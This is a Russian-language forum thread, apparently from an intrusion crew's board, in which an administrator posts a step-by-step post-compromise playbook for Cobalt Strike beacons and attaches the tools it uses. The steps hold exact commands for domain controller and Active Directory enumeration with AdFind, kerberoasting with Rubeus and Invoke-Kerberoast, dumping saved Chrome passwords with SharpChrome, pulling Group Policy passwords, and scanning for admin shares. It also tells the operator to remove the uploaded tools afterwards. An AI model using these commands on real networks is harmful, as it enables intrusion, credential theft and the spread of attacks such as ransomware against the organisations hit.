@@ -1,0 +1,119 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Initial Access »
+    Fast-Guide
+
+Fast-Guide
+Alter · 2 · 67
+« предыдущая тема следующая тема »
+
+Страницы: 1
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        Просмотр профиля Личное сообщение (Оффлайн) 
+
+: Февраля 11, 2021, 02:27:10 am
+Записан
+
+На входе мы имеем обычного бота с пользовательскими правами и рассматриваем первый этап работы с этого контекста.
+
+1. Сбор информации о домен контроллерах в сети
+   -   net domain_controllers
+   -   net dclist
+   -   shell nltest /dclist:
+Чаще всего хватает первой команды из трех, но если она не отдает результата - можно попробовать остальные.
+
+2. Сбор информации о составе Active Directory при помощи AdFind.exe
+   -   загружаем adfind.exe и adf.bat в папку доступную для записи
+   -   переходим кобальт биконом в эту папку
+   -   запускаем shell adf.bat
+   -   ждем окончания работы скрипта
+   -   выкачиваем результат и удаляем то что загрузили на машину
+
+3. Проводим kerberoast атаку
+   -   execute-assembly /home/omar/Desktop/Fast-Guide/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt
+   -   execute-assembly /home/omar/Desktop/Fast-Guide/Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt
+   -   выкачиваем получившиеся файлы (если они выдали результат)
+   -   если не выдали то используем альтернативный powershell скрипт для проведения атаки
+   -   powershell-import /home/omar/Desktop/Fast-Guide/Invoke-Kerberoast.ps1
+   -   psinject 4728 x86 Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath c:\ProgramData\pshashes.txt -append -force -encoding UTF8
+      4728 в данном случае это текущий пид, а х86 его разрядность
+   (полученные хеши отправятся в брут для получения клиртекст паролей либо будут использованы в контексте SYSTEM прав)
+
+4. Собираем информацию с браузера Chrome для поиска возможных локальных cleatext credentials
+   -   execute-assembly /home/omar/Desktop/Fast-Guide/SharpChrome.exe logins /showall
+   (тут мы получаем набор паролей текущего пользователя и некоторое представление о сетевых и внешних ресурсах куда он ходит)
+
+5. Запрашиваем информацию о доменных администраторах и локальных администраторах
+   -   shell net group "domain admins" /dom
+   -   shell net localgroup administrators
+
+6. Собираем информацию по текущей машине при помощи SeatBelt
+   -   execute-assembly /home/omar/Desktop/Fast-Guide/Seatbelt.exe -group=all -outputfile="C:\ProgramData\seatinfo.txt"
+   (пояснений тут не даю, количество проверок там приличное и вся информация собранная в той или иной степени важная как в локальной машине так и в сети)
+   
+7. Проверяем наличие сохраненных паролей в файлах групповых политик домена
+   -   execute-assembly /home/omar/Desktop/Fast-Guide/Net-GPPPassword.exe
+   
+8. Собираем доступные shares и смотрим результат, есть ли доступные для нашего текущего пользователя какие-либо $ADMIN шары в домене
+   -   powershell-import /home/omar/Desktop/Fast-Guide/ShareFinder.ps1
+   -   psinject 4728 x86 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt
+   (в данный момент пошел скан и его результат записывается в файл, полностью файл обретет размер когда скан закончится и его можно будет скачать)
+
+Все файлы вывода утилит складываем в папочку с названием кейса, вывод бикона записываем в отдельный файл creds.txt который будет лежать в этой папочке.
+* adf.bat (0.34 КБ - загружено 2 раз.)
+* ShareFinder.ps1 (44.41 КБ - загружено 1 раз.)
+* AdFind.exe (1361.5 КБ - загружено 3 раз.)
+* Invoke-Kerberoast.ps1 (45.75 КБ - загружено 2 раз.)
+
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        Просмотр профиля Личное сообщение (Оффлайн) 
+
+Ответ #1 : Февраля 11, 2021, 02:28:16 am
+Записан
+
+Рекомендую пользоваться всеми приложенными в топике c# утилитами собирая их из исходников на гитхабе.
+* Net-GPPPassword.exe (9 КБ - загружено 1 раз.)
+* Rubeus.exe (223 КБ - загружено 4 раз.)
+* Seatbelt.exe (534 КБ - загружено 1 раз.)
+* SharpChrome.exe (805.5 КБ - загружено 1 раз.)
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Initial Access »
+    Fast-Guide
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
